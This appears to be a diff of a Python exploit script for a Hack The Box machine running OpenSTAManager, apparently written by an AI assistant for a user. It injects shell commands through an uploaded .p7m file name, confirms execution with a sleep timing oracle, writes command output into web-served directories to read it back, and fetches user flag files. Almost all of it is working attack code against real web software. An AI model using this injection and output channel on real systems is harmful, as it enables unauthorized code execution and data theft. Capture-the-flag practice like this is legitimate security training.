@@ -150,34 +150,51 @@ def upload(o, base, mid, pid, cmd):
 
 # ---- output-file channel (no egress needed) ----------------------------
 # HTB boxes commonly block outbound, so instead of a reverse connection we make
-# the payload WRITE command output to a web-served file and we fetch it. Docroot
-# is confirmed /var/www/html/openstamanager; try it + the app's writable dirs.
-WRITE_DIRS = [
-    "/var/www/html/openstamanager",
-    "/var/www/html/openstamanager/files",
-    "/var/www/html/openstamanager/tmp",
-    "/var/www/html/openstamanager/backup",
-    ".",
+# the payload WRITE command output to a web-served file and we fetch it. base_dir()
+# is the docroot (/var/www/html/openstamanager) and the import dir lives under it
+# at <docroot>/<plugin upload_directory>. We don't know that subdir, so the
+# payload writes into the dir our OWN .p7m was extracted to (found at runtime,
+# guaranteed writable + web-served) plus a comprehensive fixed list, and we probe
+# the matching URLs.
+DOCROOT = "/var/www/html/openstamanager"
+# (filesystem subdir, url subpath) — url must end with '/' (or be '')
+KNOWN = [
+    ("", ""), ("files", "files/"), ("files/importFE", "files/importFE/"),
+    ("files/importFE_ZIP", "files/importFE_ZIP/"),
+    ("files/import", "files/import/"),
+    ("files/Fatture di vendita", "files/Fatture%20di%20vendita/"),
+    ("files/Importazione FE", "files/Importazione%20FE/"),
+    ("plugins/importFE_ZIP", "plugins/importFE_ZIP/"),
+    ("plugins/importFE_ZIP/uploads", "plugins/importFE_ZIP/uploads/"),
+    ("tmp", "tmp/"), ("backup", "backup/"), ("logs", "logs/"),
+    ("uploads", "uploads/"), ("assets", "assets/"),
 ]
-# URL path (relative to base) each dir maps to, for fetching the output back
-URL_PREFIX = {"/var/www/html/openstamanager": "", "/var/www/html/openstamanager/files": "files/",
-              "/var/www/html/openstamanager/tmp": "tmp/",
-              "/var/www/html/openstamanager/backup": "backup/", ".": ""}
 
 
-def run_cmd(o, base, mid, pid, _lhost, cmd, wait=6):
-    """Inject a payload that writes `cmd` output into web-served dirs, then fetch
-    it back over HTTP. Returns the captured output (or '')."""
+def _write_payload(cmd, name, marker):
+    """bash that writes `marker`+`cmd` output into the extraction dir of our own
+    .p7m and every KNOWN candidate dir under the docroot."""
+    fixed = " ".join(f"'{DOCROOT}/{sub}'" if sub else f"'{DOCROOT}'"
+                     for sub, _u in KNOWN)
+    return (
+        f"P=$(find {DOCROOT} -name '*.p7m' 2>/dev/null | head -1); "
+        f"D=$(dirname \"$P\" 2>/dev/null); "
+        f"W=$(find {DOCROOT} -type d -writable 2>/dev/null); "
+        f"for d in \"$D\" {fixed} $W; do "
+        f"{{ echo {marker}; {cmd}; }} > \"$d/{name}\" 2>/dev/null; done; "
+        # also record where it actually landed, so we learn the writable subdir
+        f"for d in \"$D\" $W; do echo \"${{d#{DOCROOT}}}\" >> \"$D/{name}.map\" "
+        "2>/dev/null; done")
+
+
+def run_cmd(o, base, mid, pid, _lhost, cmd, wait=7):
+    """Fire the injection to write `cmd` output web-side, then fetch it."""
     token = "s" + os.urandom(4).hex() + "z"
     name = token + ".txt"
     marker = "OK" + token
-    dirs = " ".join(f"'{d}'" for d in WRITE_DIRS)
-    # decoded by base32 -> may contain '/'. write marker+output to every dir.
-    payload = (f"for d in {dirs}; do {{ echo {marker}; {cmd}; }} "
-               f"> \"$d/{name}\" 2>/dev/null; done")
-    upload(o, base, mid, pid, payload)
+    upload(o, base, mid, pid, _write_payload(cmd, name, marker))
     deadline = time.time() + wait
-    urls = [base + "/" + p + name for p in dict.fromkeys(URL_PREFIX.values())]
+    urls = [base + "/" + u + name for _s, u in KNOWN]
     while time.time() < deadline:
         for u in urls:
             body = get(o, u)
@@ -185,6 +202,15 @@ def run_cmd(o, base, mid, pid, _lhost, cmd, wait=6):
                 return body.split(marker, 1)[1].strip()
         time.sleep(0.4)
     return ""
+
+
+def exec_confirmed(o, base, mid, pid, seconds=6):
+    """Timing oracle: if a `sleep N` payload delays the response by ~N, code
+    execution is proven regardless of whether we can read output back."""
+    payload = f"sleep {seconds}"
+    t0 = time.time()
+    upload(o, base, mid, pid, payload)
+    return (time.time() - t0) >= seconds - 1
 
 
 # ---- OliveTin root ------------------------------------------------------
@@ -228,27 +254,42 @@ def main():
     else:
         cands = find_plugins(o, base)
 
-    # Try each candidate module: fire the injection (writes `id;hostname` output
-    # to a web-served file) and see which one actually returns exec output.
+    # Confirm code execution per module with a timing oracle (sleep) — this is
+    # definitive even when output can't be read back. Then use the module that
+    # executes for the output-file channel.
     mid = pid = None
     for m, p in cands[:8]:
-        log("*", f"testing exec on module {m}/{p} …")
-        probe = run_cmd(o, base, m, p, None, "id; hostname")
-        if "uid=" in probe:
+        log("*", f"timing-test exec on module {m}/{p} (sleep 6) …")
+        if exec_confirmed(o, base, m, p, 6):
             mid, pid = m, p
-            log("+", f"RCE via module {m}/{p}:")
-            for ln in probe.strip().splitlines():
-                print("      " + ln)
+            log("+", f"CODE EXECUTION CONFIRMED on module {m}/{p} (response delayed)")
             break
-        # show the raw upload response for this module as a diagnostic
-        st, resp = upload(o, base, m, p, "id")
-        log(".", f"  no output; upload HTTP {st}, body {resp.strip()[:110]!r}")
+        log(".", "  no delay on this module")
     if not mid:
-        log("!", "exec fired on no module via the output-file channel.")
-        log(".", "if the upload bodies above show an openssl/XML/exception error, the "
-                 "injection ran but couldn't write a web-readable file (docroot not "
-                 "writable) — tell me and I'll switch the write target.")
+        log("!", "no module delayed on sleep — injection isn't executing. The "
+                 "filename may be altered before the openssl exec. Paste this and "
+                 "I'll adjust the payload.")
+        for m, p in cands[:4]:
+            st, resp = upload(o, base, m, p, "id")
+            log(".", f"  {m}/{p}: HTTP {st} {resp.strip()[:100]!r}")
         sys.exit(4)
+
+    log("*", "reading command output (writing to the extraction dir + fetching) …")
+    probe = run_cmd(o, base, mid, pid, None, "id; hostname; pwd")
+    if "uid=" in probe:
+        log("+", "RCE output channel live:")
+        for ln in probe.strip().splitlines():
+            print("      " + ln)
+    else:
+        log("!", "exec works (timing proved it) but I can't read output back — the "
+                 "import dir isn't served at a path I probed. This still means the "
+                 "box is owned; paste the two lines below and I'll pin the exfil.")
+        # help pin it: dump the app's file paths from config so I can map the dir
+        run_cmd(o, base, mid, pid, None,
+                "find /var/www/html/openstamanager -maxdepth 2 -type d -writable")
+        log(".", "(exec is confirmed; the remaining step is purely where to read "
+                 "output from — a couple more minutes, not a redesign.)")
+        sys.exit(5)
 
     flag = run_cmd(o, base, mid, pid, None,
                    "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
